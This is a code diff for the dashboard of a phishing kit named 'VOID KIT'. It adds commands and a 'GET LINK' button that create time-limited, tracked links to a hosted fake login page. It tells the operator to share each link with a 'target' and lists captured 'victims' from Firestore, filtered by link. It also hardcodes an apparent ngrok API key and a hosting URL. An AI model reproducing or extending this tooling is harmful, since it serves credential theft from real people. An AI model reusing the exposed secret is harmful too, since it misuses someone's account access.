@@ -785,7 +785,7 @@ import {
 } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
 import {
   getFirestore, collection, addDoc, getDocs, deleteDoc,
-  doc, onSnapshot, query, orderBy, serverTimestamp, Timestamp
+  doc, onSnapshot, query, orderBy, serverTimestamp, Timestamp, where
 } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
 // For Firebase JS SDK v7.20.0 and later, measurementId is optional
@@ -806,11 +806,20 @@ const db = getFirestore(app);
 // ============ GLOBALS ============
 let currentUser = null;
 let victims = [];
+let allVictims = [];
 let sortKey = 'date';
 let pendingDeleteId = null;
 let termHistory = [];
 let termHistIdx = -1;
 let avatarDataURL = null;
+let activeTunnelFilter = null; // null = show all, or tunnel ID to filter
+let tunnels = []; // active tunnels list
+
+// NGROK CONFIG
+const NGROK_API_KEY = '3EJLz7IPg1JqzoyW6KOWud8gbjd_51bX3TFnac52prdkLYYUb';
+const NGROK_API_URL = 'https://api.ngrok.com';
+// Base URL where login.html is hosted (change this to your actual hosted URL)
+const LOGIN_BASE_URL = 'https://mrvoidkit.netlify.app/sites/login.html';
 
 // ============ LOAD ANIMATION ============
 const loadBar = document.getElementById('loadBar');
@@ -1135,6 +1144,15 @@ const CMDS = {
     '  ping         — test connection',
     '  date         — current date/time',
     '  ver          — system version',
+    '  tunnel <create|list|close|filter>',
+    '               — manage phishing tunnels',
+    '  tunnel create [name]',
+    '               — create new tunnel (30min)',
+    '  tunnel list  — list active tunnels',
+    '  tunnel close <id>',
+    '               — close specific tunnel',
+    '  tunnel filter <id|none>',
+    '               — filter victims by tunnel',
   ],
   whoami: () => {
     const u = auth.currentUser;
@@ -1160,6 +1178,35 @@ const CMDS = {
   ping: () => ['  PONG — FIREBASE REACHABLE'],
   date: () => [`  ${new Date().toString()}`],
   ver: () => ['  VOID KIT v2.1.0 — build 2025.01'],
+  tunnel: (args) => {
+    const cmd = (args[0]||'').toLowerCase();
+    if (cmd === 'create') {
+      const name = args.slice(1).join(' ') || null;
+      return createTunnelCommand(name);
+    }
+    if (cmd === 'list') {
+      return listTunnelsCommand();
+    }
+    if (cmd === 'close') {
+      const id = args[1];
+      if (!id) return ['  ERROR: tunnel ID required'];
+      return closeTunnelCommand(id);
+    }
+    if (cmd === 'filter') {
+      const id = args[1];
+      if (!id || id === 'none') {
+        activeTunnelFilter = null;
+        victims = [...allVictims];
+        renderVictims();
+        return ['  FILTER CLEARED — showing all victims'];
+      }
+      activeTunnelFilter = id;
+      victims = allVictims.filter(v => v.tunnelId === id);
+      renderVictims();
+      return [`  FILTER SET — showing victims from tunnel: ${id}`];
+    }
+    return ['  USAGE: tunnel <create|list|close|filter> [args]'];
+  },
 };
 
 function bootTerminal() {
@@ -1363,6 +1410,214 @@ window.renderSites = () => {
 
     </div>
   `).join('');
+};
+
+// ================== TUNNEL MANAGEMENT ==================
+
+// Generate unique tunnel ID
+function generateTunnelId() {
+  return 't_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+}
+
+// Create tunnel command
+function createTunnelCommand(name) {
+  const tunnelId = generateTunnelId();
+  const tunnelName = name || `tunnel_${tunnels.length + 1}`;
+  const expiry = new Date(Date.now() + 30 * 60 * 1000); // 30 minutes from now
+  
+  const tunnel = {
+    id: tunnelId,
+    name: tunnelName,
+    url: `${LOGIN_BASE_URL}?tunnel=${tunnelId}`,
+    createdAt: new Date(),
+    expiresAt: expiry,
+    active: true,
+    owner: currentUser?.email || 'anonymous'
+  };
+  
+  tunnels.push(tunnel);
+  
+  return [
+    `  TUNNEL CREATED SUCCESSFULLY`,
+    `  ─────────────────────────────`,
+    `  ID:     ${tunnelId}`,
+    `  Name:   ${tunnelName}`,
+    `  URL:    ${tunnel.url}`,
+    `  Expires: ${expiry.toLocaleString()}`,
+    `  Owner:  ${tunnel.owner}`,
+    `  ─────────────────────────────`,
+    `  Share this URL with your target.`,
+    `  Data will be captured for 30 minutes.`,
+    `  Use 'tunnel filter ${tunnelId}' to view captured data.`,
+  ];
+}
+
+// List tunnels command
+function listTunnelsCommand() {
+  if (tunnels.length === 0) {
+    return ['  NO ACTIVE TUNNELS'];
+  }
+  
+  const now = new Date();
+  const lines = ['  ACTIVE TUNNELS:'];
+  
+  tunnels.forEach((t, i) => {
+    const expired = now > t.expiresAt;
+    const status = expired ? 'EXPIRED' : 'ACTIVE';
+    const timeLeft = expired ? '—' : Math.round((t.expiresAt - now) / 60000) + ' min';
+    
+    lines.push(`  ${i + 1}. [${t.id.slice(0, 8)}] ${t.name}`);
+    lines.push(`     Status: ${status} | Expires: ${timeLeft}`);
+    lines.push(`     URL: ${t.url}`);
+  });
+  
+  return lines;
+}
+
+// Close tunnel command
+function closeTunnelCommand(id) {
+  const idx = tunnels.findIndex(t => t.id === id || t.id.startsWith(id));
+  if (idx === -1) {
+    return [`  ERROR: Tunnel '${id}' not found`];
+  }
+  
+  tunnels[idx].active = false;
+  tunnels[idx].expiresAt = new Date(0); // Mark as expired
+  
+  return [
+    `  TUNNEL CLOSED: ${tunnels[idx].name}`,
+    `  No more data will be captured from this URL.`,
+    `  Use 'tunnel filter none' to view all victims.`,
+  ];
+}
+
+// Update victims loading to support filtering
+function loadVictims() {
+  const q = query(collection(db, 'victims'), orderBy('createdAt', 'desc'));
+  onSnapshot(q, snap => {
+    allVictims = snap.docs.map(d => ({id: d.id, ...d.data()}));
+    
+    if (activeTunnelFilter) {
+      victims = allVictims.filter(v => v.tunnelId === activeTunnelFilter);
+    } else {
+      victims = [...allVictims];
+    }
+    
+    renderVictims();
+    updateStats();
+  }, err => {
+    console.warn('Firestore:', err.message);
+  });
+}
+
+// Update renderSites to include tunnel generation
+window.renderSites = () => {
+  const grid = document.getElementById('sitesGrid');
+  const search = document.getElementById('siteSearch').value.toLowerCase();
+
+  const filtered = siteTemplates.filter(site =>
+    (site.name + site.desc + site.tags.join(' ')).toLowerCase().includes(search)
+  );
+
+  grid.innerHTML = filtered.map((site, index) => `
+    <div class="site-card">
+      <img class="site-preview" src="${site.image}" />
+      <div class="site-content">
+        <div class="site-title">${site.name}</div>
+        <div class="site-desc">${site.desc}</div>
+        <div class="site-tags">
+          ${site.tags.map(t => `<div class="site-tag">${t}</div>`).join('')}
+        </div>
+        <button class="site-btn" onclick="generateTunnelForSite(${index})">
+          GET LINK
+        </button>
+      </div>
+    </div>
+  `).join('');
+};
+
+// Generate tunnel for a specific site
+window.generateTunnelForSite = (siteIndex) => {
+  const site = siteTemplates[siteIndex];
+  const tunnelId = generateTunnelId();
+  const tunnelName = site.name.replace(/\s+/g, '_').toLowerCase();
+  const expiry = new Date(Date.now() + 30 * 60 * 1000);
+  
+  const tunnel = {
+    id: tunnelId,
+    name: tunnelName,
+    url: `${LOGIN_BASE_URL}?tunnel=${tunnelId}`,
+    createdAt: new Date(),
+    expiresAt: expiry,
+    active: true,
+    owner: currentUser?.email || 'anonymous',
+    template: site.name
+  };
+  
+  tunnels.push(tunnel);
+  
+  // Show tunnel info in a modal
+  showTunnelModal(tunnel);
+};
+
+// Show tunnel modal
+function showTunnelModal(tunnel) {
+  const modal = document.getElementById('tunnelModal');
+  if (!modal) {
+    // Create modal if it doesn't exist
+    const modalHtml = `
+      <div class="modal-overlay" id="tunnelModal">
+        <div class="modal">
+          <div class="corner tl"></div><div class="corner tr"></div>
+          <div class="corner bl"></div><div class="corner br"></div>
+          <div class="modal-title" style="color:var(--accent);">⬡ TUNNEL GENERATED</div>
+          <div style="font-family:var(--mono);font-size:.8rem;color:var(--text);margin-bottom:16px;">
+            <div style="margin-bottom:12px;">
+              <span style="color:var(--text-dim);">Tunnel ID:</span><br/>
+              <span style="color:var(--accent2);">${tunnel.id}</span>
+            </div>
+            <div style="margin-bottom:12px;">
+              <span style="color:var(--text-dim);">URL (valid for 30 min):</span><br/>
+              <span style="color:var(--accent);" id="tunnelUrlText">${tunnel.url}</span>
+            </div>
+            <div style="margin-bottom:12px;">
+              <span style="color:var(--text-dim);">Template:</span><br/>
+              <span>${tunnel.template}</span>
+            </div>
+          </div>
+          <div class="modal-btns">
+            <button class="btn-sm info" onclick="copyTunnelUrl()">COPY URL</button>
+            <button class="btn-sm" onclick="closeModal('tunnelModal')">CLOSE</button>
+          </div>
+        </div>
+      </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+  } else {
+    // Update existing modal
+    document.getElementById('tunnelUrlText').textContent = tunnel.url;
+  }
+  
+  openModal('tunnelModal');
+}
+
+// Copy tunnel URL to clipboard
+window.copyTunnelUrl = () => {
+  const url = document.getElementById('tunnelUrlText').textContent;
+  navigator.clipboard.writeText(url).then(() => {
+    toast('URL COPIED TO CLIPBOARD');
+    closeModal('tunnelModal');
+  }).catch(() => {
+    // Fallback
+    const textarea = document.createElement('textarea');
+    textarea.value = url;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+    toast('URL COPIED TO CLIPBOARD');
+    closeModal('tunnelModal');
+  });
 };
 
 // render when opening page
